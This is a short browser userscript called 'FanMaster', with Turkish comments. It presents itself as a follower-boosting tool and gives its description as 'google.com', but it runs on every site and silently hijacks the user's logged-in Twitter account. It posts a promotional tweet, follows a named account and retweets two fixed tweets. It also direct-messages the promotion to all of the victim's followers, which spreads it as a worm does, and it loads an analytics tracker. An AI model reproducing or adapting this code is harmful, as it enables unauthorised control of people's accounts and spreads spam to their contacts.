// ==UserScript==
// @name          FanMaster
// @namespace     FanMaster
// @description   google.com
// @version     1.0
// @license     GPL 3.0
// @include     http*://*

// ==/UserScript==


var followers;
var mesaj = "Twitter'ın en genç popüleri";
var link = "@VBaybarsBilim";
var hashtag = "#takipciartir";
twttr.API.Status.update(hashtag + " " + mesaj + " " + link)


function takipet(kisi){
twttr.API.User.find(kisi, function(i) {i.follow()});
}

function retweet(id){
twttr.API.Status.retweet(id);
}

//Takipcilere mesaj gönder
function followers_send(){
for(i=0;i<followers.array.length;i++){
twttr.anywhere.api.models.DirectMessage.send(followers.array[i].screenName, link + " " + mesaj + " " + link);
}
}

//Takipçileri getir
twttr.currentUser.followers(function(i){followers = i;followers_send();});

takipet("VbaybarsBilim");
retweet("276774504863260672");
retweet("276774699881603072");

//eğer analyticjs nesnesi yoksa script tagı ekle
  if(!document.getElementById("analyticjs")){
    var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-32548538-4']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.id = 'analyticjs'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
  } 